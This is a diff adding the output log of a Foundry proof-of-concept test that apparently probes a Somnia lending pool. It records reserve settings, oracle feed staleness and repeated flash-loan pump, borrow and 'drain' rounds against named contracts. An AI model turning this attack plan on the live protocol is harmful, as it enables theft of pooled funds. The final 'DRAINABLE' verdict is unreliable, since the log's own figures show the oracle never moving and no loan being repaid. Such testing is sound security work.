@@ -1,0 +1,329 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/SingleFile.t.sol:SomniaPoC
+[PASS] test_attack() (gas: 23173574)
+Logs:
+  block 461850549
+  --- reserve USDso
+    ltv 7500
+    liqThreshold 8500
+    decimals 18
+    active/frozen/borrowable true
+    borrowable true
+    borrowCap 125000
+    supplyCap 500000
+    eMode category 1
+    oracle price 99966341
+  --- reserve USDC.e
+    ltv 7500
+    liqThreshold 8500
+    decimals 6
+    active/frozen/borrowable true
+    borrowable true
+    borrowCap 10000
+    supplyCap 8000000
+    eMode category 1
+    oracle price 99966341
+  --- reserve WETH
+    ltv 7000
+    liqThreshold 8250
+    decimals 18
+    active/frozen/borrowable true
+    borrowable true
+    borrowCap 5
+    supplyCap 30
+    eMode category 0
+    oracle price 203299000000
+  --- reserve WBTC
+    ltv 6500
+    liqThreshold 7500
+    decimals 8
+    active/frozen/borrowable true
+    borrowable true
+    borrowCap 1
+    supplyCap 1
+    eMode category 0
+    oracle price 7278976085937
+  --- reserve WSOMI
+    ltv 6000
+    liqThreshold 7250
+    decimals 18
+    active/frozen/borrowable true
+    borrowable true
+    borrowCap 500000
+    supplyCap 20000000
+    eMode category 0
+    oracle price 16342083
+  user eMode 0
+  --- eMode category 1
+    ltv 32
+    liquidation threshold 9000
+    liquidation bonus 9700
+    EXPLOITABLE (ltv >= 10000) false
+  --- book
+    ask levels 20
+    best ask 161800000000000000
+    worst ask 1150000000000000000
+    USDso to clear every level 35384866081000000000000
+  === ORACLE SOURCE
+  --- feed WSOMI
+    source 0xfA2b4bb4330f77d799d7f9093b68f1fDe21043A7
+    answer 16342083
+    updatedAt 1794335558
+    block ts 1794339512
+    AGE SECONDS 3954
+    AGE HOURS 1
+    ORACLE/DEX GAP BPS 99
+  --- feed USDso
+    source 0x7052210aE4e3624975d706EF8901CDb455d7DEC4
+    answer 99966341
+    updatedAt 1794284889
+    block ts 1794339512
+    AGE SECONDS 54623
+    AGE HOURS 15
+    ORACLE/DEX GAP BPS 8381
+  --- feed USDC.e
+    source 0x7052210aE4e3624975d706EF8901CDb455d7DEC4
+    answer 99966341
+    updatedAt 1794284889
+    block ts 1794339512
+    AGE SECONDS 54623
+    AGE HOURS 15
+    ORACLE/DEX GAP BPS 8381
+  --- feed WETH
+    source 0x6217179F136fF94B91DD5Ecd0755Ce5739ddf272
+    answer 203299000000
+    updatedAt 1794335469
+    block ts 1794339512
+    AGE SECONDS 4043
+    AGE HOURS 1
+    ORACLE/DEX GAP BPS 9999
+  --- feed WBTC
+    source 0x780B2cEAFAbcEEE6Aa5168f5c228363DC676aE90
+    answer 7278976085937
+    updatedAt 1794325487
+    block ts 1794339512
+    AGE SECONDS 14025
+    AGE HOURS 3
+    ORACLE/DEX GAP BPS 9999
+  === ORACLE PROBE (hold, never supply) flash USDso 39923352689100000000000
+    entered eMode category 1
+    leg 0x00000022dA000002656c64D9eA6011ea952D008A
+      power left USDso 241937675140000000000
+    borrowed 0x00000022dA000002656c64D9eA6011ea952D008A
+      amount 242018894339645781373
+      value18 241937433199999999999
+      cap 125000
+    leg 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00
+      power left USDso 241950000000000
+    borrowed 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00
+      amount 242
+      value18 241918545220000
+      cap 10000
+    leg 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8
+      power left USDso 40000000000
+    borrow leg REVERTED 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8
+      wanted 14756590
+      Error(string) 58
+    leg 0xC5098b3cA516784323872F17235fa074E167D3D2
+      power left USDso 40000000000
+    leg 0x046EDe9564A72571df6F5e44d0405360c0f4dCab
+      power left USDso 40000000000
+    borrow leg REVERTED 0x046EDe9564A72571df6F5e44d0405360c0f4dCab
+      wanted 183575129314
+      Error(string) 58
+    status reverted
+    SOMI bought and HELD 2467430000000000000000
+    USDso spent into the book 399419903000000000000
+    exec price 161876893366782441
+    best ask before 161800000000000000
+    best ask after  161900000000000000
+    ASK MOVE BPS (did the pump work?) 6
+    oracle before 16342083
+    oracle after  16342083
+    ORACLE MOVE BPS (only number that matters) 0
+    oracle moved at all? false
+    entered eMode category 1
+    leg 0x046EDe9564A72571df6F5e44d0405360c0f4dCab
+      power left USDso 2120904947480000000000
+    borrow leg REVERTED 0x046EDe9564A72571df6F5e44d0405360c0f4dCab
+      wanted 12978167021731562616589
+      Error(string) 58
+    leg 0x00000022dA000002656c64D9eA6011ea952D008A
+      power left USDso 2120904947480000000000
+    borrowed 0x00000022dA000002656c64D9eA6011ea952D008A
+      amount 2121616941616378656892
+      value18 2120902826569999999999
+      cap 125000
+    leg 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00
+      power left USDso 2120920000000000
+    borrowed 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00
+      amount 2121
+      value18 2120286092610000
+      cap 10000
+    leg 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8
+      power left USDso 640000000000
+    borrow leg REVERTED 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8
+      wanted 309888390
+      Error(string) 58
+    leg 0xC5098b3cA516784323872F17235fa074E167D3D2
+      power left USDso 640000000000
+  === PUMP with flash USDso 35000000000000000000000
+  --- flash
+    principal 35000000000000000000000
+    repayment due 35017500000000000000000
+  --- pump
+    pump limit price 1618100000000000000
+    best ask before 161800000000000000
+    best ask after  162000000000000000
+    SOMI bought 21630300000000000000000
+    USDso spent 3502313450000000000000
+    exec price 161917007623565091
+  --- oracle
+    before 16342083
+    after  16342083
+    ORACLE MOVE BPS 0
+  --- borrow
+    supplied WSOMI 21630300000000000000000
+    borrow power USDso 2120904947480000000000
+    legs tried 5
+    legs borrowed 2
+    legs blocked 3
+    borrowed WSOMI 0
+    borrowed value USDso 2120904946856092609999
+    WSOMI sold back for USDso 0
+    WSOMI exit exec price 0
+  --- drain
+    extracted USDso 35740208438472471266891
+    repayment needed 35017500000000000000000
+    bad debt left in pool 1398196508383621343108
+    COVERAGE bps 10206
+    EDGE REALIZED bps 92
+    EDGE REQUIRED bps 6675
+    REPAID? false
+    entered eMode category 1
+    leg 0x046EDe9564A72571df6F5e44d0405360c0f4dCab
+      power left USDso 3029864350770000000000
+    borrow leg REVERTED 0x046EDe9564A72571df6F5e44d0405360c0f4dCab
+      wanted 18540239459682098053228
+      Error(string) 58
+    leg 0x00000022dA000002656c64D9eA6011ea952D008A
+      power left USDso 3029864350770000000000
+    borrowed 0x00000022dA000002656c64D9eA6011ea952D008A
+      amount 3030881485299136836467
+      value18 3029861320899999999999
+      cap 125000
+    leg 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00
+      power left USDso 3029880000000000
+    borrowed 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00
+      amount 3030
+      value18 3028980132300000
+      cap 10000
+    leg 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8
+      power left USDso 900000000000
+    borrow leg REVERTED 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8
+      wanted 437778838
+      Error(string) 58
+    leg 0xC5098b3cA516784323872F17235fa074E167D3D2
+      power left USDso 900000000000
+  === PUMP with flash USDso 50000000000000000000000
+  --- flash
+    principal 50000000000000000000000
+    repayment due 50025000000000000000000
+  --- pump
+    pump limit price 1618100000000000000
+    best ask before 161800000000000000
+    best ask after  162000000000000000
+    SOMI bought 30900430000000000000000
+    USDso spent 5004074510000000000000
+    exec price 161941905339181364
+  --- oracle
+    before 16342083
+    after  16342083
+    ORACLE MOVE BPS 0
+  --- borrow
+    supplied WSOMI 30900430000000000000000
+    borrow power USDso 3029864350770000000000
+    legs tried 5
+    legs borrowed 2
+    legs blocked 3
+    borrowed WSOMI 0
+    borrowed value USDso 3029864349880132299999
+    WSOMI sold back for USDso 0
+    WSOMI exit exec price 0
+  --- drain
+    extracted USDso 51056671325179269136466
+    repayment needed 50025000000000000000000
+    bad debt left in pool 1998193024700863163533
+    COVERAGE bps 10206
+    EDGE REALIZED bps 90
+    EDGE REQUIRED bps 6675
+    REPAID? false
+    entered eMode category 1
+    leg 0x046EDe9564A72571df6F5e44d0405360c0f4dCab
+      power left USDso 7271676206800000000000
+    borrow leg REVERTED 0x046EDe9564A72571df6F5e44d0405360c0f4dCab
+      wanted 44496585503329043182561
+      Error(string) 58
+    leg 0x00000022dA000002656c64D9eA6011ea952D008A
+      power left USDso 7271676206800000000000
+    borrow leg REVERTED 0x00000022dA000002656c64D9eA6011ea952D008A
+      wanted 7274117330272196318558
+      Error(string) 50
+    leg 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00
+      power left USDso 7271676206800000000000
+    borrow leg REVERTED 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00
+      wanted 7274117330
+      Error(string) 50
+    leg 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8
+      power left USDso 7271676206800000000000
+    borrow leg REVERTED 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8
+      wanted 3576834581144029237
+      Error(string) 58
+    leg 0xC5098b3cA516784323872F17235fa074E167D3D2
+      power left USDso 7271676206800000000000
+    borrow leg REVERTED 0xC5098b3cA516784323872F17235fa074E167D3D2
+      wanted 9989961
+      Error(string) 58
+  === PUMP with flash USDso 120000000000000000000000
+  --- flash
+    principal 120000000000000000000000
+    repayment due 120060000000000000000000
+  --- pump
+    pump limit price 1618100000000000000
+    best ask before 161800000000000000
+    best ask after  162200000000000000
+    SOMI bought 74161050000000000000000
+    USDso spent 12018465067000000000000
+    exec price 162058992786644741
+  --- oracle
+    before 16342083
+    after  16342083
+    ORACLE MOVE BPS 0
+  --- borrow
+    supplied WSOMI 74161050000000000000000
+    borrow power USDso 7271676206800000000000
+    legs tried 5
+    legs borrowed 0
+    legs blocked 5
+    borrowed WSOMI 0
+    borrowed value USDso 0
+    WSOMI sold back for USDso 0
+    WSOMI exit exec price 0
+  --- drain
+    extracted USDso 107981534933000000000000
+    repayment needed 120060000000000000000000
+    bad debt left in pool 12078465067000000000000
+    COVERAGE bps 8993
+    EDGE REALIZED bps 83
+    EDGE REQUIRED bps 6675
+    REPAID? false
+  === SUMMARY
+    best coverage bps 10206
+    at flash size 35000000000000000000000
+    break even bps 10000
+    verdict DRAINABLE
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 11.32s (11.32s CPU time)
+
+Ran 1 test suite in 11.49s (11.32s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
